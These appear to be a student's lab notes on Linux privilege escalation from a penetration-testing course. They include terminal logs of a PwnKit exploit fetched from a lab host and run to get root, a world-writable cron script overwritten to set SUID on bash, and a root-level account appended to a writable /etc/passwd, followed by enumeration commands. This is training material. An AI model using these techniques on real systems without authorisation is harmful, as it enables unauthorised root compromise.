# Linux Privilege Escalation

Connecting to a machine withouth ssh adding it to the know hosts file:
```bash
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -p 2222 student@192.168.230.52`

```
## Enumeration
always start with looking at the os info etc. and the kernel version. This can be done with the following commands:

```bash
cat /etc/os-release
uname -a
```

then use searchsploit to find exploits for the kernel version. easiest way is to use google
`site:exploit-db.com <kernel version> exploit` or `site:exploit-db.com <kernel version> privilege escalation`

look for SUID binaries with the following command:
```bash
find / -perm -u=s -type f 2>/dev/null
```
and cron can be a way to escalate privileges. check the cron jobs with the following command:
```bash
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.monthly/*
cat /etc/cron.weekly/*
```
but maybe its easier to check the syslog first
```bash
cat /var/log/syslog | grep -i cron
```
or on modern distro's using `journalctl -u cron`
`cat /var/log/cron.log` or `journalctl -u cron` to see if there are any cron jobs running as root that can be exploited.



## Pwnkit
```bash
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ wget 192.168.45.179/45010.c
--2026-11-09 06:58:58--  http://192.168.45.179/45010.c
Connecting to 192.168.45.179:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13176 (13K) [text/x-csrc]
Saving to: ‘45010.c’

45010.c                   100%[=====================================>]  12.87K  --.-KB/s    in 0.02s   

2026-11-09 06:58:58 (536 KB/s) - ‘45010.c’ saved [13176/13176]

joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ gcc 45010.c -o 45010
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ file 45010
45010: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dd15fe9ed0b8bc7da0ee0d0dc643a5cb29f83bf1, not stripped
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ ./45010
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[!] failed to create bpf map: 'Operation not permitted'
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/at
/usr/bin/pkexec
/bin/su
/bin/fusermount
/bin/ping
/bin/ntfs-3g
/bin/mount
/bin/umount
/bin/ping6
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ oe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:~$ cat /etc/issue
oe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:~$: command not found
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ Ubuntu 16.04.4 LTS \n \l
Ubuntu: command not found
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ 
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:~$ uname -r
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:~$: command not found
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ 4.4.0-116-generic
4.4.0-116-generic: command not found
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:~$ arch
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:~$: command not found
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ x86_64
$ 
-sh: 1: joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:~$: not found
$ 
$ sysctl kernel.unprivileged_bpf_disabled
kernel.unprivileged_bpf_disabled = 1
$ clear
$ sysctl kernel.unprivileged_bpf_disabled
kernel.unprivileged_bpf_disabled = 1
$ sysctl kernel.unprivileged_userns_clone
kernel.unprivileged_userns_clone = 1
$ cat /proc/version
Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
$ sudo -l
sudo: unable to resolve host lab-pwk2-student-216-ubuntu-linux-privesc-242-180
[sudo] password for joe: 
Sorry, user joe may not run sudo on lab-pwk2-student-216-ubuntu-linux-privesc-242-180.
$ ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 23376 Jan 17  2016 /usr/bin/pkexec
$ pkexec --version
pkexec version 0.105
$ ls
45010    systemd-private-fa49384e01b54bffa297cbdf67b017e1-systemd-timesyncd.service-eEXMpF
45010.c  unix-privesc-check
$ pwd
/tmp
$ exit
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ ls
45010    systemd-private-fa49384e01b54bffa297cbdf67b017e1-systemd-timesyncd.service-eEXMpF
45010.c  unix-privesc-check
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ nano exploit.c
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ nano evil-so.c
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ nano Makefile
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ make 
The program 'make' can be found in the following packages:
 * make
 * make-guile
Ask your administrator to install one of them
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ gcc -shared -o evil.so -fPIC evil-so.c
evil-so.c: In function ‘gconv_init’:
evil-so.c:10:5: warning: implicit declaration of function ‘setgroups’ [-Wimplicit-function-declaration]
     setgroups(0);
     ^
evil-so.c:12:5: warning: null argument where non-null required (argument 2) [-Wnonnull]
     execve("/bin/sh", NULL, NULL);
     ^
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ gcc exploit.c -o exploit
exploit.c: In function ‘main’:
exploit.c:26:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
     execve(BIN, argv, envp);
     ^
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ exploit
exploit: command not found
joe@lab-pwk2-student-216-ubuntu-linux-privesc-242-180:/tmp$ ./exploit
# whoami
root
# ls /root/flag.txt
/root/flag.txt
# cat /root/flag.txt
OS{93e99c9314680304b5cc8be17336fb57}
# Connection to 192.168.230.216 closed.
```


## Cron Privesc
```bash
┌──(student㉿d39ca6bf69cc)-[~]
└─$ ls -la /etc/cron* /var/spool/cron 2>/dev/null                                                       
-rw-r--r-- 1 root root 1042 Feb 22  2021 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x 1 root root 4096 Dec  7  2021 .
drwxr-xr-x 1 root root 4096 Nov  9 07:11 ..
-rw-r--r-- 1 root root  102 Feb 22  2021 .placeholder
-rw-r--r-- 1 root root  201 Mar 20  2020 e2scrub_all

/etc/cron.daily:
total 32
drwxr-xr-x 1 root root 4096 Dec  7  2021 .
drwxr-xr-x 1 root root 4096 Nov  9 07:11 ..
-rw-r--r-- 1 root root  102 Feb 22  2021 .placeholder
-rwxr-xr-x 1 root root 1478 Oct 21  2020 apt-compat
-rwxr-xr-x 1 root root 1100 Sep  3  2020 dpkg
-rwxr-xr-x 1 root root 4722 May  4  2021 exim4-base
-rwxr-xr-x 1 root root 1123 Jul  5  2020 man-db

/etc/cron.hourly:
total 16
drwxr-xr-x 1 root root 4096 Dec  7  2021 .
drwxr-xr-x 1 root root 4096 Nov  9 07:11 ..
-rw-r--r-- 1 root root  102 Feb 22  2021 .placeholder
-rw-r--r-- 1 root root  139 Dec  7  2021 archiver

/etc/cron.monthly:
total 12
drwxr-xr-x 2 root root 4096 Dec  7  2021 .
drwxr-xr-x 1 root root 4096 Nov  9 07:11 ..
-rw-r--r-- 1 root root  102 Feb 22  2021 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x 1 root root 4096 Dec  7  2021 .
drwxr-xr-x 1 root root 4096 Nov  9 07:11 ..
-rw-r--r-- 1 root root  102 Feb 22  2021 .placeholder
-rwxr-xr-x 1 root root  813 Jul  5  2020 man-db

/var/spool/cron:
total 12
drwxr-xr-x 1 root root    4096 Dec  7  2021 .
drwxr-xr-x 1 root root    4096 Dec  7  2021 ..
drwx-wx--T 1 root crontab 4096 Dec  7  2021 crontabs
┌──(student㉿d39ca6bf69cc)-[~]
└─$ cat /etc/crontab                                                                                    
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
┌──(student㉿d39ca6bf69cc)-[~]
└─$ ps -ef | grep -i archiver                                                                           
student      176      23  0 07:24 pts/0    00:00:00 grep --color=auto -i archiver
┌──(student㉿d39ca6bf69cc)-[~]
└─$ find / -name '*archiver*' 2>/dev/null                                                               
/etc/cron.hourly/archiver
┌──(student㉿d39ca6bf69cc)-[~]
└─$ ls -l /etc/cron.hourly/archiver                                                                     
-rw-r--r-- 1 root root 139 Dec  7  2021 /etc/cron.hourly/archiver
┌──(student㉿d39ca6bf69cc)-[~]
└─$ cat /etc/cron.hourly/archiver                                                                       
#!/bin/sh

# I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
/var/archives/archive.sh
┌──(student㉿d39ca6bf69cc)-[~]
└─$ ls /var/archives/archive.sh                                                                         
/var/archives/archive.sh
┌──(student㉿d39ca6bf69cc)-[~]
└─$ ls -lah /var/archives/archive.sh                                                                    
-rwxrwxrwx 1 root root 159 Nov 15  2021 /var/archives/archive.sh
┌──(student㉿d39ca6bf69cc)-[~]
└─$ echo 'chmod u+s /bin/bash' > /var/archives/archive.sh                                               
┌──(student㉿d39ca6bf69cc)-[~]
└─$ tail /var/log/
alternatives.log  btmp              exim4/            lastlog           
apt/              cron.log          faillog           runit/            
bootstrap.log     dpkg.log          journal/          wtmp              
┌──(student㉿d39ca6bf69cc)-[~]
└─$ tail /var/log/cron.log                                                                              
07:16:01 running the archiver
07:17:01 running the archiver
07:18:01 running the archiver
07:19:01 running the archiver
07:20:01 running the archiver
07:21:01 running the archiver
07:22:01 running the archiver
07:23:01 running the archiver
07:24:01 running the archiver
07:25:01 running the archiver
┌──(student㉿d39ca6bf69cc)-[~]
└─$ tail /var/log/cron.log                                                                              
07:16:01 running the archiver
07:17:01 running the archiver
07:18:01 running the archiver
07:19:01 running the archiver
07:20:01 running the archiver
07:21:01 running the archiver
07:22:01 running the archiver
07:23:01 running the archiver
07:24:01 running the archiver
07:25:01 running the archiver
┌──(student㉿d39ca6bf69cc)-[~]
└─$ tail /var/log/cron.log                                                                              
07:16:01 running the archiver
07:17:01 running the archiver
07:18:01 running the archiver
07:19:01 running the archiver
07:20:01 running the archiver
07:21:01 running the archiver
07:22:01 running the archiver
07:23:01 running the archiver
07:24:01 running the archiver
07:25:01 running the archiver
┌──(student㉿d39ca6bf69cc)-[~]
└─$ cat /etc/cron.hourly/archiver                                             
#!/bin/sh

# I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
/var/archives/archive.sh
┌──(student㉿d39ca6bf69cc)-[~]
└─$ echo 'chmod u+s /bin/bash' > /var/archives/archive.sh                                         
┌──(student㉿d39ca6bf69cc)-[~]
└─$ cat /etc/cron.hourly/archiver                                               
#!/bin/sh

# I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
/var/archives/archive.sh
┌──(student㉿d39ca6bf69cc)-[~]
└─$ tail /var/log/cron.log                                                
07:16:01 running the archiver
07:17:01 running the archiver
07:18:01 running the archiver
07:19:01 running the archiver
07:20:01 running the archiver
07:21:01 running the archiver
07:22:01 running the archiver
07:23:01 running the archiver
07:24:01 running the archiver
07:25:01 running the archiver
┌──(student㉿d39ca6bf69cc)-[~]
└─$ cat /var/archives/archive.sh
chmod u+s /bin/bash
┌──(student㉿d39ca6bf69cc)-[~]
└─$ tail /var/log/cron.log                                                                         
07:16:01 running the archiver
07:17:01 running the archiver
07:18:01 running the archiver
07:19:01 running the archiver
07:20:01 running the archiver
07:21:01 running the archiver
07:22:01 running the archiver
07:23:01 running the archiver
07:24:01 running the archiver
07:25:01 running the archiver
┌──(student㉿d39ca6bf69cc)-[~]
└─$ tail /var/log/cron.log                                                                              
07:16:01 running the archiver
07:17:01 running the archiver
07:18:01 running the archiver
07:19:01 running the archiver
07:20:01 running the archiver
07:21:01 running the archiver
07:22:01 running the archiver
07:23:01 running the archiver
07:24:01 running the archiver
07:25:01 running the archiver
┌──(student㉿d39ca6bf69cc)-[~]
└─$ Read from remote host 192.168.230.52: Connection reset by peer                                      
Connection to 192.168.230.52 closed.
client_loop: send disconnect: Broken pipe
                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -p 2222 student@192.168.230.52
Warning: Permanently added '[192.168.230.52]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to the PEN-200 Kali Linux Shell.
student@192.168.230.52's password: 
┌──(student㉿b8af113d32af)-[~]
└─$ echo 'chmod u+s /bin/bash' >> /var/archives/archive.sh                                              
┌──(student㉿b8af113d32af)-[~]
└─$ cat  /var/archives/archive.sh                                                                       
#!/bin/bash

TIMESTAMP=$(date +"%T")
echo "$TIMESTAMP running the archiver"
#cp -rf /home/kali/ /var/backups/kali/
cp -rf /home/student/ /var/backups/student/
chmod u+s /bin/bash
┌──(student㉿b8af113d32af)-[~]
└─$ tail /var/log/cron.log 
07:29:01 running the archiver
07:30:01 running the archiver
┌──(student㉿b8af113d32af)-[~]
└─$ ls -lah /bin/bash                                                                                   
-rwsr-xr-x 1 root root 1.2M Oct 15  2020 /bin/bash
┌──(student㉿b8af113d32af)-[~]
└─$ /bin/bash                                                                                           
bash-5.1$ whoami
student
bash-5.1$ su
Password: 
su: Authentication failure
bash-5.1$ bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/flag.txt
OS{c7f959689e4183f6de2a0c03e9c6defa}
```

## world writable file privesc
```bash
└─$ ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -p 2222 student@192.168.230.52
Warning: Permanently added '[192.168.230.52]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to the PEN-200 Kali Linux Shell.
student@192.168.230.52's password: 
┌──(student㉿496d25e69362)-[~]
└─$ find / -perm -4000 -type f 2>/dev/null   # SUID                                                     
find / -perm -2000 -type f 2>/dev/null   # SGID
/usr/bin/passwd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/expiry
/usr/bin/wall
/usr/bin/chage
/usr/bin/write.ul
/usr/bin/ssh-agent
/usr/sbin/unix_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
┌──(student㉿496d25e69362)-[~]
└─$ getcap -r / 2>/dev/null                                                                             
┌──(student㉿496d25e69362)-[~]
└─$ find / -writable -type f 2>/dev/null                                                                
find / -perm -o+w -type d 2>/dev/null
/proc/keys
/proc/kcore
/proc/timer_list
/proc/sched_debug
/proc/1/task/1/attr/current
/proc/1/task/1/attr/exec
/proc/1/task/1/attr/fscreate
/proc/1/task/1/attr/keycreate
/proc/1/task/1/attr/sockcreate
/proc/1/task/1/attr/display
/proc/1/task/1/attr/smack/current
/proc/1/task/1/attr/apparmor/current
/proc/1/task/1/attr/apparmor/exec
/proc/1/attr/current
/proc/1/attr/exec
/proc/1/attr/fscreate
/proc/1/attr/keycreate
/proc/1/attr/sockcreate
/proc/1/attr/display
/proc/1/attr/smack/current
/proc/1/attr/apparmor/current
/proc/1/attr/apparmor/exec
/proc/1/timerslack_ns
/proc/7/task/7/attr/current
/proc/7/task/7/attr/exec
/proc/7/task/7/attr/fscreate
/proc/7/task/7/attr/keycreate
/proc/7/task/7/attr/sockcreate
/proc/7/task/7/attr/display
/proc/7/task/7/attr/smack/current
/proc/7/task/7/attr/apparmor/current
/proc/7/task/7/attr/apparmor/exec
/proc/7/attr/current
/proc/7/attr/exec
/proc/7/attr/fscreate
/proc/7/attr/keycreate
/proc/7/attr/sockcreate
/proc/7/attr/display
/proc/7/attr/smack/current
/proc/7/attr/apparmor/current
/proc/7/attr/apparmor/exec
/proc/7/timerslack_ns
/proc/9/task/9/attr/current
/proc/9/task/9/attr/exec
/proc/9/task/9/attr/fscreate
/proc/9/task/9/attr/keycreate
/proc/9/task/9/attr/sockcreate
/proc/9/task/9/attr/display
/proc/9/task/9/attr/smack/current
/proc/9/task/9/attr/apparmor/current
/proc/9/task/9/attr/apparmor/exec
/proc/9/attr/current
/proc/9/attr/exec
/proc/9/attr/fscreate
/proc/9/attr/keycreate
/proc/9/attr/sockcreate
/proc/9/attr/display
/proc/9/attr/smack/current
/proc/9/attr/apparmor/current
/proc/9/attr/apparmor/exec
/proc/9/timerslack_ns
/proc/10/task/10/sched
/proc/10/task/10/comm
/proc/10/task/10/mem
/proc/10/task/10/clear_refs
/proc/10/task/10/attr/current
/proc/10/task/10/attr/exec
/proc/10/task/10/attr/fscreate
/proc/10/task/10/attr/keycreate
/proc/10/task/10/attr/sockcreate
/proc/10/task/10/attr/display
/proc/10/task/10/attr/smack/current
/proc/10/task/10/attr/apparmor/current
/proc/10/task/10/attr/apparmor/exec
/proc/10/task/10/oom_adj
/proc/10/task/10/oom_score_adj
/proc/10/task/10/loginuid
/proc/10/task/10/uid_map
/proc/10/task/10/gid_map
/proc/10/task/10/projid_map
/proc/10/task/10/setgroups
/proc/10/sched
/proc/10/autogroup
/proc/10/timens_offsets
/proc/10/comm
/proc/10/mem
/proc/10/clear_refs
/proc/10/attr/current
/proc/10/attr/exec
/proc/10/attr/fscreate
/proc/10/attr/keycreate
/proc/10/attr/sockcreate
/proc/10/attr/display
/proc/10/attr/smack/current
/proc/10/attr/apparmor/current
/proc/10/attr/apparmor/exec
/proc/10/oom_adj
/proc/10/oom_score_adj
/proc/10/loginuid
/proc/10/coredump_filter
/proc/10/uid_map
/proc/10/gid_map
/proc/10/projid_map
/proc/10/setgroups
/proc/10/timerslack_ns
/proc/20/task/20/sched
/proc/20/task/20/comm
/proc/20/task/20/mem
/proc/20/task/20/clear_refs
/proc/20/task/20/attr/current
/proc/20/task/20/attr/exec
/proc/20/task/20/attr/fscreate
/proc/20/task/20/attr/keycreate
/proc/20/task/20/attr/sockcreate
/proc/20/task/20/attr/display
/proc/20/task/20/attr/smack/current
/proc/20/task/20/attr/apparmor/current
/proc/20/task/20/attr/apparmor/exec
/proc/20/task/20/oom_adj
/proc/20/task/20/oom_score_adj
/proc/20/task/20/loginuid
/proc/20/task/20/uid_map
/proc/20/task/20/gid_map
/proc/20/task/20/projid_map
/proc/20/task/20/setgroups
/proc/20/sched
/proc/20/autogroup
/proc/20/timens_offsets
/proc/20/comm
/proc/20/mem
/proc/20/clear_refs
/proc/20/attr/current
/proc/20/attr/exec
/proc/20/attr/fscreate
/proc/20/attr/keycreate
/proc/20/attr/sockcreate
/proc/20/attr/display
/proc/20/attr/smack/current
/proc/20/attr/apparmor/current
/proc/20/attr/apparmor/exec
/proc/20/oom_adj
/proc/20/oom_score_adj
/proc/20/loginuid
/proc/20/coredump_filter
/proc/20/uid_map
/proc/20/gid_map
/proc/20/projid_map
/proc/20/setgroups
/proc/20/timerslack_ns
/home/student/.bashrc.original
/home/student/.bash_logout
/home/student/.zshrc
/home/student/.profile
/home/student/.bashrc
/etc/passwd
/var/tmp
/run/lock
/run/screen
/sys/firmware
/tmp
/dev/shm
/dev/mqueue
/proc/acpi
/proc/scsi
┌──(student㉿496d25e69362)-[~]
└─$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd                                  
┌──(student㉿496d25e69362)-[~]
└─$ su root2
Password: 
┌──(root💀496d25e69362)-[/home/student]
└─# whoami                                                                                              
root
┌──(root💀496d25e69362)-[/home/student]
└─# ls /root/flag.txt
/root/flag.txt
┌──(root💀496d25e69362)-[/home/student]
└─# cat /root/flag.txt                                                                                
OS{9fb69a38460593b92b5c785503c44b38}
```

For hunting file-permission issues, lean on find with permission/ownership filters:

SUID/SGID binaries (the classic privesc vector):

find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID

Cross-check any unusual hits against GTFOBins.

Capabilities (same idea, different mechanism):

getcap -r / 2>/dev/null

World-writable files/directories — anything root reads or executes that you can modify is gold:

find / -writable -type f 2>/dev/null
find / -perm -o+w -type d 2>/dev/null

Files owned by root but writable by you — target configs, scripts, cron jobs specifically:

find / -user root -perm -o+w 2>/dev/null

Readable sensitive files (shadow, ssh keys, configs):

find / -name "*.conf" -readable 2>/dev/null

Always pipe stderr to /dev/null — find / throws a lot of permission-denied noise otherwise. Once you get hits, the next move is always GTFOBins for SUID/cap binaries, or just inspecting what a writable file actually controls.

